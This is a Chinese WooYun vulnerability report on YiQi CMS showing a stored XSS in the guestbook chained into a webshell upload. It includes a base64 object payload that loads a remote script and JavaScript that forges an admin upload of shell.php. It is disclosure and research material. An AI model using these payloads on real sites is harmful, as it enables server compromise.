{"id": 50522, "wybug_id": "wooyun-2014-077599", "wybug_title": "易企CMS xss 盲打后台 getshell", "wybug_corp": "易企CMS", "wybug_author": "menmen519", "wybug_date": "2014-09-28 19:02", "wybug_open_date": "2014-12-27 19:04", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["黑盒测试技巧", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向公众公开  简要描述： 易企CMS xss 盲打后台 getshell 详细说明：  直接进入网站留言：\n\n然后去后台查看留言：\n\n这里我们更换一下payload:<object data=\"data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3NpdGUuY29tL3NoZWxsLmpzPjwvc2NyaXB0Pg==\">加载一个远程的js，http://site.com/shell.js js里面可以这样写：\n<script>\t\t\tfunction ajax(){\t\t\t\tvar request = false;\t\t\t\tif(window.XMLHttpRequest) {\t\t\t\t\trequest = new XMLHttpRequest();\t\t\t\t} else if(window.ActiveXObject) {\t\t\t\t\tvar versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];\t\t\t\t\tfor(var i=0; i<versions.length; i++) {\t\t\t\t\t\ttry {\t\t\t\t\t\t\trequest = new ActiveXObject(versions[i]);\t\t\t \t\t\t\t\t\t} catch(e) {}\t\t\t  \t\t\t\t\t}\t\t\t  \t\t\t\t}\t\t\t  \t\t\t\treturn request;\t\t\t  \t\t\t}\t\t\tvar _x = ajax();\t\t\t  \t\t\tpostgo();\t\t\tfunction postgo() {\t\t\t  \t\t\t\tsrc=\"http://192.168.10.70/yiqicms/admin/product-add.php\";\t\t\t\tdata=\"------WebKitFormBoundaryB6QWa9tMYBn1hUTB\\r\\nContent-Disposition: form-data; name=\"productname\"\\r\\n\\r\\nxxxxxx\\r\\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\\r\\nContent-Disposition: form-data; name=\"productcategory\"\\r\\n\\r\\n3\\r\\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\\r\\nContent-Disposition: form-data; name=\"productseotitle\"\\r\\n\\r\\nxxxxxx\\r\\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\\r\\nContent-Disposition: form-data; name=\"productkeywords\"\\r\\n\\r\\n\\r\\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\\r\\nContent-Disposition: form-data; name=\"productdescription\"\\r\\n\\r\\n\\r\\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\\r\\nContent-Disposition: form-data; name=\"productthumb\"; filename=\"shell.php\"\\r\\nContent-Type: application/php\\r\\n\\r\\n\\r\\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\\r\\nContent-Disposition: form-data; name=\"productadddate\"\\r\\n\\r\\n2014-09-28 09:13:04\\r\\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\\r\\nContent-Disposition: form-data; name=\"productfilename\"\\r\\n\\r\\n\\r\\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\\r\\nContent-Disposition: form-data; name=\"producttemplets\"\\r\\n\\r\\n{style}/product.tpl\\r\\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\\r\\nContent-Disposition: form-data; name=\"productcontent\"\\r\\n\\r\\n<p>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>\\r\\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\\r\\nContent-Disposition: form-data; name=\"chk[]\"\\r\\n\\r\\n1\\r\\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\\r\\nContent-Disposition: form-data; name=\"extname[1]\"\\r\\n\\r\\n\\r\\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\\r\\nContent-Disposition: form-data; name=\"extvalue[1]\"\\r\\n\\r\\n\\r\\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\\r\\nContent-Disposition: form-data; name=\"action\"\\r\\n\\r\\nsave\\r\\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB--\";\t\t\t\txhr_act(\"POST\",src,data);\t\t\t  \t\t\t}\t\t\t  \t\t\tfunction xhr_act(_m,_s,_a){\t\t\t\t_x.open(_m,_s,false);\t\t\t\t\t\t\t\tcookie = document.cookie;\t\t\t\tif(_m==\"POST\"){\t\t\t\t\t_x.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded; charset=UTF-8\");\t\t\t\t\t_x.setRequestHeader(\"Cookie\",cookie);\t\t\t\t}\t\t\t  \t\t\t\t_x.send(_a);\t\t\t  \t\t\t\treturn _x.responseText;\t\t\t \t\t\t}\n这段代码就是在后台有一个添加产品的地方，我们直接看代码：product-add.php(27-45):\nif(!empty($_FILES[\"productthumb\"][\"name\"]))\t{\t    require_once(\"../include/upload.class.php\");\t    $filedirectory = YIQIROOT.\"/uploads/image\";\t    $filename = date(\"ymdhis\");\t    $filetype = $_FILES['productthumb']['type'];\t    $upload = new Upload;\t    $upload->set_max_size(1800000); \t    $upload->set_directory($filedirectory);\t    $upload->set_tmp_name($_FILES['productthumb']['tmp_name']);\t    $upload->set_file_size($_FILES['productthumb']['size']);\t    $upload->set_file_ext($_FILES['productthumb']['name']); \t    $upload->set_file_type($filetype); \t    $upload->set_file_name($filename); \t    \t    $upload->start_copy(); \t    \t    if($upload->is_ok())\t    {\t        $productthumb = YIQIPATH.\"uploads/image/\".$filename.'.'.$upload->user_file_ext;\t    }\t    else\t    {\t        exit($upload->error());\t    }\n发现问题了没有，这里的filename=date(\"ymdhis\")我们跟进去$upload->set_file_name($filename);在看看：upload.class.php(55-59):\nfunction set_file_name($file)     {         $this->user_file_name = $file;         $this->user_full_name = $this->directory_name.\"/\".$this->user_file_name.\".\".$this->user_file_ext;     }\n这里没有做任何限制，什么后缀  就什么保留当管理员审核我们留言的时候，我们提交之后发现在这个目录下有个shell文件：\n\n。。。。。。。。   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-10-03 18:07 厂商回复： 谢谢支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-28 19:07 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  请手下我的膝盖    \n     2014-09-28 19:49 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  吼    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}